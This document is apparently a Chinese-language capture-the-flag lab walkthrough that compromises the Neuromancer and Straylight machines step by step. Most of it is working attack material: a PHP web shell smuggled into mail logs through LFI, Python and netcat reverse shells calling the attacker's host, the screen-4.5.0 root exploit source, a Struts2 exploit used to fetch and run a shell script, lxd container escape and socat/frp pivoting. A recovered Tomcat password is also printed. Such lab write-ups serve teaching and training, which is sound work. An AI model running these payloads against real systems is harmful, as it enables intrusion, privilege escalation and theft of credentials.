
1、nmap -sP 172.16.2.0/24
MAC Address: 08:00:27:93:4F:55 (Oracle VirtualBox virtual NIC)
Nmap scan report for 172.16.2.5
发现2.5是该环境IP！


2、nmap 172.16.2.5
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp （hadoop-datanode）

开启了邮件服务、web服务、3000端口web服务！
Datanode是HDFS文件系统的工作节点,它们根据客户端或者是namenode的调度进行存储和检索数据,并且定期向namenode发送它们所存储的块(block)的列表！

3、web信息收集
访问：http://172.16.2.5
会自动跳转到：http://172.16.2.5/xwx.html
发现这是两个人的对话！

4、新思路爆破目录：gobuster
gobuster dir -u http://172.16.2.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt （用gobuster通过medium目录文本去爆破服务器）

===============================================================
2022/03/05 22:58:20 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 309] [--> http://172.16.2.5/manual/]
/freeside             (Status: 301) [Size: 311] [--> http://172.16.2.5/freeside/]

发现存在/manual和/freeside目录！

信息枚举：
http://172.16.2.5/manual   ---这就是apache的主页面
http://172.16.2.5/freeside   ---是一张卫星图片，没什么信息


5、3000端口信息枚举
访问：http://172.16.2.5:3000  ---这是个管理登录页面：Welcome to ntopng
admin/admin  ---弱口令成功登录
登录在上行主菜单点击：Flows
发现存在：/turing-bolo/目录
http://172.16.2.5/turing-bolo/
往下滑发现个触发按钮：Submit Query   
页面跳转到：http://172.16.2.5/turing-bolo/bolo.php?bolo=case   ---查询字符串参数bolo
?bolo=case 这和文件包含的?page= 一样的格式，查看内容：
Operator Gamma: Adding other member logs to directory...:
molly.log
armitage.log
riviera.log
页面中还包含这三个日志文件！

6、邮件信息枚举---通过开启了mail 25端口
通过LFI文件包含漏洞查看底层：/var/log/mail
访问：
http://172.16.2.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail
页面显示了日志文件的内容被合并到网页中了，默认补充后缀.log信息。
可以看到了mail日志了，根据日志我们可以看到日志里包含了发件人和收件人信息：
hackerman @straylight和root@straylight互相往来的邮件信息！

nc 172.16.2.5 25  或者：telnet 172.16.2.5 25
1）HELO hackerman    ---向服务器标识用户身份
2）MAIL FROM:"hackerman <?php echo shell_exec($_GET['cmd']);?>"   ---MAIL FROM:发件人
3）RCPT TO:root   ---RCPT TO:收件人
4）DATA    ---开始编辑邮件内容
5）.       ---输入点代表编辑结束
http://172.16.2.5/turing-bolo/bolo.php?bolo=../../../../var/log/mail&cmd=id

加入python一句话：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.2.4",6677));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c 'import pty; pty.spawn("/bin/bash")'

ctrl+z
stty raw -echo
fg
-----

内网信息枚举：查看SUID

find / -perm -4000 2>/dev/null
发现screen存在4.5.0版本信息！

wget http://172.16.2.4:5555/LinEnum.sh


提权方法：
--------------------
/bin/screen-4.5.0
谷歌搜索：screen-4.5.0 exploit
41154：https://www.exploit-db.com/exploits/41154

----命名为：libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
----

----命名为：rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
----
kali开启：python3 -m http.server 8081

项目下载：
cd /tmp
wget http://172.16.2.4:8081/libhax.c
wget http://172.16.2.4:8081/rootshell.c


gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
成功获得root权限！
--------------------
获取一个稳定shell：
先python继续反弹shell！！！
python -c 'import pty; pty.spawn("/bin/bash")'

哑shell无法编辑py文件解决：
export SHELL=bash
export TERM=xterm-256color
stty rows 54 columns 104
ctrl+z
stty raw -echo
fg

--------------------

查找存活IP：
for i in $(seq 1 255); do ping -c 1 172.16.3.$i; done | grep "bytes from"

64 bytes from 172.16.3.3: icmp_seq=1 ttl=255 time=0.164 ms
64 bytes from 172.16.3.4: icmp_seq=1 ttl=64 time=0.626 ms
64 bytes from 172.16.3.6: icmp_seq=1 ttl=64 time=0.009 ms

查找3.4端口：
for i in $(seq 1 65535); do nc -nvz -w 1 172.16.3.4 $i 2>&1; done | grep -v "Connection refused"

(UNKNOWN) [172.16.3.4] 8009 (?) open
(UNKNOWN) [172.16.3.4] 8080 (http-alt) open
(UNKNOWN) [172.16.3.4] 34483 (?) open
发现开启了8009、8080、34483端口！
需要将它们通过隧道传输到与我相同的网络上！
which socat
/usr/bin/socat
安装了socat！


端口转发：附加一个与号“&”在后台运行 socat 命令
socat TCP-LISTEN:8009,fork,reuseaddr TCP:172.16.3.4:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr TCP:172.16.3.4:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr TCP:172.16.3.4:34483 &


“＆”号只是标准的.nix语法，用于运行命令并将其放到后台，以便您可以继续使用其他内容！
这样就能在外部网络查看到他们三个端口的服务了，可以用nmap进行扫描了，这里还可以用netstat -plunt也能看出！

netstat -plunt   ---查看本地的服务端口情况

----------------------------------------------------------------------

项目二十：************

nmap信息枚举：
nmap -T5 -A -p8009,8080,34483 172.16.2.5
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp  open  http    Apache Tomcat 9.0.0.M26
|_http-title: Apache Tomcat/9.0.0.M26
34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4

开放的三个端口分别是tomcat以及ssh的端口！

在项目十九信息收集发现：/root目录存在note.txt
cat note.txt
/struts2_2.3.15.1-showcase

访问：
http://172.16.2.5:8080/struts2_2.3.15.1-showcase/showcase.action


webshell：CVE-2017-9791
发现这是S2的：Struts2 Showcase exploit
谷歌：https://www.exploit-db.com/exploits/42324

拷贝脚本到kali本地目录：
cp /usr/share/exploitdb/exploits/multiple/webapps/42324.py .

查看代码就是执行python脚本回弹外壳！那么要在socat建立一个反弹shell的端口：
socat TCP-LISTEN:8081,fork,reuseaddr TCP:172.16.2.4:8081 &

----
可以执行wget将反向shell直接拉向Neuromancer，可以在4321/tcp的kali上设置一个侦听的Python SimpleHTTPServer的服务，由于端口转发，任何wget在Neuromancer上对Straylight执行的请求4321/tcp都可以找到kali本机，先开启4321端口转发！

socat tcp-listen:4321,fork tcp:172.16.2.4:4321 &
socat tcp-listen:5555,fork tcp:172.16.2.4:5555 &

python3 -m http.server 4321

用pentestmonkey总结的反弹shell：写入dayu.sh文件中！
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.3.6 4321 >/tmp/f

本地开启监听：
nc -vlp 6667

执行S2的脚本：文件上传
python 42324.py http://172.16.2.5:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget http://172.16.3.6:5555/dayu.sh -O /tmp/dayu.sh"

文件赋权：
python 42324.py http://172.16.2.5:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/dayu.sh"

远程执行：
python 42324.py http://172.16.2.5:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "sh /tmp/dayu.sh"

成功获得反弹shell：拿稳定shell第三种方法
which ssh-keygen   ---安装了keygen

ssh-keygen   ---一直回车就行
cd ~/.ssh
cp id_rsa.pub authorized_keys
chmod 400 *
cat id_rsa

然后回到kali执行：touch id_rsa
将ta用户中的id_rsa中的值拷贝进来!
chmod 400 *

ssh -i id_rsa -p 34483 ta@172.16.2.5   ---成功登录！


内网信息枚举：
wget http://172.16.3.6:5555/LinEnum.sh
wget http://172.16.3.6:5555/linpeas.sh
chmod +x LinEnum.sh
chmod +x linpeas.sh


提权：方法1
Linux version 4.4.0 exploit：44298
cp /usr/share/exploitdb/exploits/linux/local/44298.c .
gcc 44298.c -o dayushell
wget http://172.16.3.6:5555/dayushell
chmod +x dayushell
./dayushell
成功获得shell！

如果是32位的kali系统用gcc编译44298.c会报错，因为里面代码含有_u64写的编码…必须得64位系统用gcc编译！

CVE-2021-4034*****
虽然版本可以利用，但是该项目环境没有安装gcc！


方法二：ssh登录（通过拓展小技巧知道了）34483端口

ssh -i id_rsa -p 34483 ta@172.16.2.5

group
ta adm cdrom dip plugdev lxd lpadmin sambashare   ---这里lxd
参考资料：
https://reboare.github.io/lxd/lxd-escape.html

安装了lxd且给定用户是lxd组的成员，则它们具有以下命令的相同权限：/etc/sudoers
admin ALL=NOPASSWD: ALL！！！！

cat /proc/version
可以看出是64位的linux！


git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder/
chmod 777 *
proxychains ./build-alpine -a x86_64
最后生成：alpine-v3.13-x86_64-20210218_0139.tar.gz
然后将alpine-v3.13-x86_64-20210218_0139.tar.gz传输到目标机上！

因为前面已经socat端口转发：
wget http://172.16.3.6:5555/alpine-v3.13-x86_64-20210218_0139.tar.gz

1）要导入容器映像，使用以下命令：引用容器image（fingerprint指纹导入）
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias haxor
lxc image list   ---查看
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| haxor | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Mar 6, 2022 at 7:57am (UTC) |
+-------+--------------+--------+-------------------------------+--------+--------+-----------------------------+


2）基于导入的容器映像创建一个实际的容器：
lxc init haxor -c security.privileged=true    --- -c可以提供容器所有功能
lxc list
+-----------------+---------+------+------+------------+-----------+
|      NAME       |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-----------------+---------+------+------+------------+-----------+
| innocent-octopu | STOPPED |      |      | PERSISTENT | 0         |
+-----------------+---------+------+------+------------+-----------+
容器名称是自动分配的！
需要为新容器innocent-octopus指定磁盘安装选项：

lxc config device add innocent-octopus whatever disk source=/ path=/mnt/root recursive=true
---装载主机文件系统的根目录/ ，并装载命名为：whatever到/mnt/root目录下，现在可以启动容器，然后使用以下命令进入bash会话！
启动容器：
lxc start innocent-octopus   ---创建容器：outgoing-osprey（名称）
lxc list
+-----------------+---------+------+------+------------+-----------+
|      NAME       |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+-----------------+---------+------+------+------------+-----------+
| outgoing-osprey | RUNNING |      |      | PERSISTENT | 0         |
+-----------------+---------+------+------+------------+-----------+


进入bash提权：
lxc exec innocent-octopus --mode=interactive /bin/sh
成功拥有root权限！！

这时候对Neuromancer文件系统具有根目录访问权限：
cd /mnt/root
cd /root    ---可以轻松进入root目录，测试可以写入文件以及查看flag
cp authorized_keys进入即可！

将前面在ta用户下生成的rsa密钥给复制过来：
cd .ssh        ---在lxd容器的root权限下进行
cp /mnt/root/home/ta/.ssh/authorized_keys authorized_keys
cp /mnt/root/home/ta/.ssh/id_rsa id_rsa
cp /mnt/root/home/ta/.ssh/id_rsa.pub id_rsa.pub

kali执行：
ssh -i ~/.ssh/id_rsa -p 34483 root@172.16.2.5
成功获得root的ssh-shell！！！

------------------------
拓展小技巧：
方法1：tomcat密码
枚举home/ta目录下：ai-gui-guide.txt
发现了-Tomcat   - /usr/local/tomcat/信息

Tomcat将用户和密码存储在名为“tomcat-users.xml”的文件中：
cd /usr/local/tomcat/
cd conf
cat tomcat-users.xml
user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"
html解码：>!Xx3JanexX!<
获得用户名密码：
Lady3Jane
>!Xx3JanexX!<
访问：8080页面上传dayu大马即可！


方法三：大批量小技巧
------------------------
#!/bin/bash

for ip in $(seq 1 254); do
   ping -c 1 172.16.3.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
------------------------
这是在对内网扫描大批量情况下需要复制黏贴使用的bash脚本！



实战拓展技能：
1、下载frp

[common]
bind_addr = 0.0.0.0
bind_port = 7000


# frpc.ini
[common]
server_addr = 192.168.253.11
server_port = 7000
[http_proxy]
type = tcp
remote_port = 7777
plugin = socks5



wget http://172.16.2.4:5555/frpc
wget http://172.16.2.4:5555/frpc.ini
./frps -c frps.ini
./frpc -c frpc.ini

proxychains curl http://172.16.3.4:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action









































